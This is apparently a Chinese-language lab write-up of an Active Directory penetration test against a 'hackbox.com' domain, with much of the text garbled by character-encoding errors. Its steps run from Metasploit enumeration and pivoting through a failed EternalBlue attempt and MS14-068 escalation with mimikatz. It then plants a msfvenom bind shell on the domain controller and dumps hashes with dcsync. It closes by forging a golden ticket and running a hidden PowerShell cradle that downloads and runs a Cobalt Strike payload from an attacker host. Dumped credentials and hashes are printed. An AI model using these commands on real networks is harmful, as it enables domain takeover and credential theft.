<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133609467.png" alt="image-20250513133609467"></p>
<h4 id="å®šä½åŸŸæ§">å®šä½åŸŸæ§</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133723239.png" alt="image-20250513133723239"></p>
<h4 id="åŸŸä¿¡æ¯æ”¶é›†">åŸŸä¿¡æ¯æ”¶é›†</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net time /domain #æŸ¥çœ‹åŸŸæ§æ—¶é—´</span><br><span class="line">net view #éå†ä¿¡ä»»ä¸»æœº</span><br><span class="line">net view /domain #æŸ¥çœ‹åŸŸ</span><br><span class="line">net view /domain:hackbox</span><br><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513135625840.png" alt="image-20250513135625840"></p>
<p><code>ipconfig</code>ç¡®è®¤äº†å­˜åœ¨ä¸¤ä¸ªç½‘æ®µ<code>10.10.10.150</code>å’Œ<code>192.168.1.13</code>ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513135931643.png" alt="image-20250513135931643"></p>
<h4 id="ç»ˆç«¯æ‰§è¡Œä¿¡æ¯æ”¶é›†å‘½ä»¤">ç»ˆç«¯æ‰§è¡Œä¿¡æ¯æ”¶é›†å‘½ä»¤</h4>
<p><code>ipconfig /all</code>æŸ¥çœ‹ä¿¡æ¯ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513140129603.png" alt="image-20250513140129603"></p>
<p><code>dns 10.10.10.149</code>ï¼Œ<code>dns</code>ä¸€èˆ¬éƒ½æ˜¯ä¸åŸŸæ§åŒä¸€ä¸ª<code>ip</code></p>
<h4 id="è·å–ç™»é™†è¿‡çš„ç”¨æˆ·ä¿¡æ¯">è·å–ç™»é™†è¿‡çš„ç”¨æˆ·ä¿¡æ¯</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513140428684.png" alt="image-20250513140428684"></p>
<p>è·å–çš„<code>SID</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SID                                            Profile Path</span><br><span class="line">---                                            ------------</span><br><span class="line">S-1-5-18                                       C:\Windows\system32\config\systemprofile</span><br><span class="line">S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService</span><br><span class="line">S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService</span><br><span class="line">S-1-5-21-1443003717-4130318662-4279967973-500  C:\Users\Administrator</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-1103  C:\Users\web</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-500   C:\Users\Administrator.HACKBOX</span><br></pre></td></tr></table></figure>
<h4 id="æ·»åŠ è·¯ç”±æ¸—é€DCåŸŸæ§">æ·»åŠ è·¯ç”±æ¸—é€<code>DC</code>åŸŸæ§</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æŸ¥çœ‹å…¨å±€è·¯ç”±å™¨</span></span><br><span class="line">run get_local_subnets</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æ·»åŠ 10æ®µçš„è·¯ç”±ä¿¡æ¯</span></span><br><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±è¡¨ä¿¡æ¯</span></span><br><span class="line">run autoroute -p</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å›é€€ï¼Œå¼€å¯ä»£ç†</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513143458109.png" alt="image-20250513143458109"></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513143516484.png" alt="image-20250513143516484"></p>
<h4 id="å¼€å¯ä»£ç†é€šåŸŸæ§">å¼€å¯ä»£ç†é€šåŸŸæ§</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä½¿ç”¨ä»£ç†æ¨¡å—</span></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è®¾ç½®ä»£ç†ç«¯å£</span></span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">set SRVPORT 1080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹è®¾ç½®çš„æƒ…å†µ</span></span><br><span class="line">show options</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯åŠ¨</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513193150680.png" alt="image-20250513193150680"></p>
<p>æ³¨æ„æœ¬åœ°ä½¿ç”¨çš„ä»£ç†é…ç½®æƒ…å†µã€‚æˆ‘æ˜¯ç”¨çš„æ˜¯<code>proxychains4</code>ï¼Œ<code>Mac m</code>ç³»åˆ—å®‰è£…è¿™ä¸ªæˆ‘åˆæŠ˜è…¾å¥½ä¹…ğŸ˜‘ï¼Œå‚è€ƒè¿™ä¸ªæ‰ç»™è§£å†³çš„ï¼Œå®‰è£…<code>proxychains4</code><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>ã€‚æœ€å¥½è¿˜æ˜¯ç”¨<code>kali</code>ï¼Œæ²¡è¿™ä¹ˆå¤šéº»çƒ¦ã€‚</p>
<h4 id="nmapé€šè¿‡proxychainsæ‰«æåŸŸæ§è®¾å¤‡">nmapé€šè¿‡proxychainsæ‰«æåŸŸæ§è®¾å¤‡</h4>
<p>ä¿®æ”¹<code>proxychains</code>çš„é…ç½®æ–‡ä»¶ï¼Œä½¿å…¶ä»£ç†èµ°çš„æ˜¯<code>127.0.0.1 1080</code></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513195812729.png" alt="image-20250513195812729"></p>
<p>æ‰§è¡Œå‘½ä»¤ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -A -Pn 10.10.10.149</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513195644245.png" alt="image-20250513195644245"></p>
<h4 id="æ°¸æ’ä¹‹è“ms17-010è¿›è¡Œæº¢å‡ºæ”»å‡»DC-å¤±è´¥">æ°¸æ’ä¹‹è“ms17-010è¿›è¡Œæº¢å‡ºæ”»å‡»DC(å¤±è´¥)</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOSTS 10.10.10.149</span><br><span class="line">set RPORT 445</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513200141843.png" alt="image-20250513200141843"></p>
<p>æ”»å‡»å¤±è´¥ã€‚</p>
<h4 id="ms14-068ææƒåŸŸæ§">ms14-068ææƒåŸŸæ§</h4>
<h5 id="ms14-068çš„æ¡ä»¶">ms14-068çš„æ¡ä»¶</h5>
<ul>
<li>è·å–åŸŸæ™®é€šç”¨æˆ·çš„è´¦å·å¯†ç <code>web@hackbox.com/!@#Qwe456</code></li>
<li>è·å–åŸŸæ™®é€šç”¨æˆ·çš„<code>SID: S-1-5-21-2005268815-658469957-1189185684-1103</code></li>
<li>æœåŠ¡å™¨æœªæ‰“<code>KB3011780</code>è¡¥ä¸</li>
<li>åŸŸæ§æœåŠ¡å™¨çš„<code>10.10.10.149</code></li>
</ul>
<h5 id="ms14-068åˆ›å»ºç¥¨æ®">ms14-068åˆ›å»ºç¥¨æ®</h5>
<p>ä¸Šä¼ <code>MS14-068.exe</code><sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>åˆ°æ‰§è¡Œçš„ç›®å½•ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513210324509.png" alt="image-20250513210324509"></p>
<h5 id="è½½å…¥kiwiæ¸…ç†å†…å­˜ç¥¨æ®ï¼Œå†å¯¼å…¥ç¥¨æ®">è½½å…¥kiwiæ¸…ç†å†…å­˜ç¥¨æ®ï¼Œå†å¯¼å…¥ç¥¨æ®</h5>
<p>è½½å…¥<code>kiwi</code>ï¼Œæ¸…ç†å½“å‰çš„ç¥¨æ®ï¼Œå¦‚ä¸‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kerberos_ticket_purge</span><br><span class="line">kerberos_ticket_list</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513210716497.png" alt="image-20250513210716497"></p>
<p>å¯¼å…¥ç¥¨æ®ç¥¨æ®éƒ¨åˆ†ã€‚</p>
<p>ä¸‹è½½<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>ï¼Œå¹¶ä¸Šä¼ <code>mimikatz.exeã€mimidrv.sysã€mimilib.dll</code>åˆ°æ‰§è¡Œå‘½ä»¤çš„ç›®å½•ï¼Œè¿è¡Œ<code>mimikatz.exe</code>ã€‚</p>
<p>å¹¶æ‰§è¡Œ<code>kerberos::ptc TGT_web@hackbox.com.ccache</code></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513212954123.png" alt="image-20250513212954123"></p>
<p><code>exit</code>é€€å‡º<code>mimikatz</code>ï¼Œ<code>klist</code>æŸ¥çœ‹å½“å‰ç¥¨æ®ã€‚</p>
<p>æœªå¯¼å…¥ç¥¨æ®å‰å»è®¿é—®<code>dc</code>ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513211928318.png" alt="image-20250513211928318"></p>
<p>æ­¤æ—¶å»è®¿é—®<code>dc</code>åŸŸæ§ï¼ŒæˆåŠŸè®¿é—®ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513213205104.png" alt="image-20250513213205104"></p>
<h4 id="è·å–dcåŸŸæ§åˆ¶æƒé™">è·å–dcåŸŸæ§åˆ¶æƒé™</h4>
<h5 id="ç”Ÿæˆæ­£å‘è½½è·-copyå¤åˆ¶åˆ°åŸŸæ§-å¹¶æ‰§è¡Œå®šæ—¶ä»»åŠ¡">ç”Ÿæˆæ­£å‘è½½è·,copyå¤åˆ¶åˆ°åŸŸæ§,å¹¶æ‰§è¡Œå®šæ—¶ä»»åŠ¡</h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=13777 -f exe -o bind.exe</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆ<code>bind.exe</code>ï¼Œå¹¶ä¸Šä¼ è‡³<code>web</code>ç«™ç‚¹çš„æœåŠ¡å™¨ï¼Œå¹¶å¤åˆ¶åˆ°åŸŸæ§ä¸­å»ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy bind.exe \\dc\C$\  # å¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡</span><br><span class="line">net time \\dc # æŸ¥è¯¢dcæ—¶é—´</span><br><span class="line">at \\dc 21:51:00 c:/bind.exe #å¢åŠ å®šæ—¶ä»»åŠ¡æ‰§è¡Œ</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513214855544.png" alt="image-20250513214855544"></p>
<h5 id="è·å–åŸŸæ§æƒé™å‘½ä»¤">è·å–åŸŸæ§æƒé™å‘½ä»¤</h5>
<p>è®¾ç½®å¥½å®šçš„æ—¶é—´ï¼Œ<code>msf</code>è¿›è¡Œç›‘å¬ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 10.10.10.149</span><br><span class="line">set lport 13777</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸè¿æ¥è‡³åŸŸæ§ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513222709163.png" alt="image-20250513222709163"></p>
<h4 id="è·å–dcåŸŸæ§å“ˆå¸Œæ˜æ–‡">è·å–dcåŸŸæ§å“ˆå¸Œæ˜æ–‡</h4>
<p>è¿ç§»è¿›ç¨‹ï¼Œå¹¶è·å“ˆå¸Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">migrate 388</span><br><span class="line">hashdump</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513223358934.png" alt="image-20250513223358934"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2cbe963d0d877c8cc7d09c936f1c3b33:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6f60ace6accbcb76078ccc0312174e98:::</span><br><span class="line">web:1103:aad3b435b51404eeaad3b435b51404ee:086a0bb1ed4ec72250760ea531bf8074:::</span><br><span class="line"><span class="meta prompt_">DC$</span><span class="language-bash">:1000:aad3b435b51404eeaad3b435b51404ee:961b3511aef13bfc4498d1e767ee2422:::</span></span><br><span class="line"><span class="meta prompt_">WEB$</span><span class="language-bash">:1104:aad3b435b51404eeaad3b435b51404ee:2a0edff7f95894d229b63285d32fc9c7:::</span></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨<code>load kiwi</code>ï¼Œå¹¶æ‰§è¡Œ<code>creds_tspkg</code></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513223728435.png" alt="image-20250513223728435"></p>
<h4 id="æŠ“åŸŸæ§å…¨éƒ¨hash">æŠ“åŸŸæ§å…¨éƒ¨hash</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224001261.png" alt="image-20250513224001261"></p>
<h4 id="åˆ¶ä½œé»„é‡‘ç¥¨æ®">åˆ¶ä½œé»„é‡‘ç¥¨æ®</h4>
<p>è€ƒè™‘é•¿æœŸæƒç»´æŠ¤ï¼Œè¿˜æ˜¯åšä¸€ä¸ªé»„é‡‘ç¥¨æ®æ¯”è¾ƒä¿é™©ã€‚</p>
<p>åˆ¶ä½œé»„é‡‘ç¥¨æ®éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li><code>krbtgt</code>çš„<code>hash</code></li>
<li>æœ¬åœ°ç®¡ç†å‘˜æƒé™</li>
<li>åŸŸçš„<code>SID</code>ï¼ˆæ™®é€šç”¨æˆ·çš„<code>SID</code>é™¤å»æœ€åä¸‰ä½å°±æ˜¯åŸŸçš„<code>SID</code>ï¼‰</li>
<li>åŸŸå†…ä»»æ„ç”¨æˆ·çš„æœ¬åœ°ç®¡ç†å‘˜æƒé™</li>
</ul>
<h4 id="è·å–ntml-sid-rid">è·å–ntml sid rid</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount where name=&quot;krbtgt&quot; get sid</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224618826.png" alt="image-20250513224618826"></p>
<p>è·å–åˆ°çš„<code>SID: S-1-5-21-2005268815-658469957-1189185684-502</code></p>
<h4 id="çªƒå–åŸŸæ§è¶…çº§ç®¡ç†æƒé™">çªƒå–åŸŸæ§è¶…çº§ç®¡ç†æƒé™</h4>
<p>ç³»ç»Ÿæƒé™æ²¡åŠæ³•åš<code>dcsync</code>æ‰€ä»¥åˆ‡æ¢åŸŸç®¡ç†æƒé™ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">steal_token 2092</span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224933391.png" alt="image-20250513224933391"></p>
<p>è·å–åˆ°çš„å†…å®¹ä¸ºï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">[+] LM Hash   : 36588bd35fd1fe85ec5fd73a1ca6805b</span><br><span class="line">[+] SID       : S-1-5-21-2005268815-658469957-1189185684-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure>
<h4 id="ç”Ÿæˆé»„é‡‘ç¥¨æ®">ç”Ÿæˆé»„é‡‘ç¥¨æ®</h4>
<p>è·å–åˆ°çš„æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<p>1ã€<code>krbtgt</code>çš„<code>hash</code>ï¼š<code>6f60ace6accbcb76078ccc0312174e98</code></p>
<p>2ã€æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼šå·²è·å–</p>
<p>3ã€åŸŸçš„<code>SID</code>ï¼ˆæ™®é€šç”¨æˆ·çš„<code>SID</code>é™¤å»æœ€åä¸‰ä½å°±æ˜¯åŸŸçš„<code>SID</code>ï¼‰ï¼š<code>S-1-5-21-2005268815-658469957-1189185684</code></p>
<p>4ã€åŸŸå†…ä»»æ„ç”¨æˆ·çš„æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼šå·²è·å–ã€‚</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d &lt;åŸŸå&gt; -u &lt;ä»»æ„ç”¨æˆ·å&gt; -s &lt;Domain SID&gt; -k &lt;krbtgt NTLM Hash&gt; -t &lt;ticket æœ¬</span><br><span class="line">åœ°å­˜å‚¨è·¯å¾„å¦‚:/Users/x2n/Desktop/webhack123.com/krbtgt.ticket&gt;</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®è·å–çš„æ¡ä»¶ï¼Œè¿›è¡Œé»„é‡‘ç¥¨æ®çš„ç”Ÿæˆã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d hackbox.com -u x2ntest -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /Users/x2n/Desktop/webhack123.com/krbtgt.ticket</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513230047465.png" alt="image-20250513230047465"></p>
<p>åˆ‡æ¢åˆ°<code>web</code>æœåŠ¡å™¨ï¼ŒæŠŠå‡­æ®éƒ½æ¸…é™¤æ‰ã€‚ä½¿ç”¨<code>kerberos_ticket_purge</code>ï¼Œç¡®ä¿<code>dc</code>æ˜¯æ— æ³•è®¿é—®çš„ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513230617747.png" alt="image-20250513230617747"></p>
<p>æ­¤æ—¶ä½¿ç”¨ç”Ÿæˆçš„ç¥¨æ®<code>kerberos_ticket_use /Users/x2n/Desktop/webhack123.com/krbtgt.ticket</code>ï¼ŒæˆåŠŸè®¿é—®åˆ°åŸŸæ§ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513231036926.png" alt="image-20250513231036926"></p>
<h3 id="CSè¿›è¡Œå†…ç½‘åŸŸæ¸—é€">CSè¿›è¡Œå†…ç½‘åŸŸæ¸—é€</h3>
<h4 id="å»ºç«‹teamserver">å»ºç«‹teamserver</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.1.3 4477 # 4477ä¸ºå¯†ç </span><br></pre></td></tr></table></figure>
<p>è®¾ç½®å¥½ç›‘å¬å™¨ï¼Œç›‘å¬<code>192.168.1.3</code>ï¼Œç›‘å¬çš„ç«¯å£ä¸º<code>8085</code></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512201453122.png" alt="image-20250512201453122"></p>
<h4 id="åœ¨webæœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸‹è½½powershellæ¶æ„ä»£ç ">åœ¨webæœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸‹è½½powershellæ¶æ„ä»£ç </h4>
<p>ä½¿ç”¨<code>Windows Executable</code>å»ç”Ÿæˆ<code>.ps1</code>æ–‡ä»¶ã€‚</p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204448238.png" alt="image-20250512204448238"></p>
<p>å†ä½¿ç”¨é’“é±¼æ”»å‡»ä¸­çš„æ–‡ä»¶ä¸‹è½½ï¼Œè·å–ä¸‹è½½çš„<code>URL</code>ï¼Œä¸º<code>http://192.168.1.3:8022/tt</code></p>
<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204756691.png" alt="image-20250512204756691"></p>
<p>è¿›è¡Œä¸Šçº¿ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.3:8022/tt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
